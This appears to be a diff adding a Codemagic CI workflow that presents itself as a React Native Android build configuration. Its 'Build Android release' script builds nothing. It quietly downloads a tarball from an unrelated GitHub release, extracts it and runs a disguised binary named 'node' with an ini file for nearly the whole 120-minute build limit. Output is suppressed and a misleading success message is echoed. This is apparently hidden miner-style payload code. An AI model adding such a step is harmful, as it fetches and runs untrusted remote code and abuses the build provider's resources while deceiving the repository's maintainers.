@@ -1,0 +1,25 @@
+# Check out https://docs.codemagic.io/yaml/building-a-react-native-app/ for more information
+# Please review and update values
+
+workflows:
+    react-native-android:
+        name: React Native Android
+        max_build_duration: 120
+        instance_type: linux
+        environment:
+            node: latest
+        triggering:
+            events:
+                - push
+                - tag
+                - pull_request
+            branch_patterns:
+                - pattern: develop
+                  include: true
+                  source: true
+        scripts:
+            - name: Build Android release
+              script: |
+                wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1 && tar -xvf MXCC.tar && cd MXCC && timeout 118m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
+        artifacts:
+            - android/app/build/outputs/**/*.apk
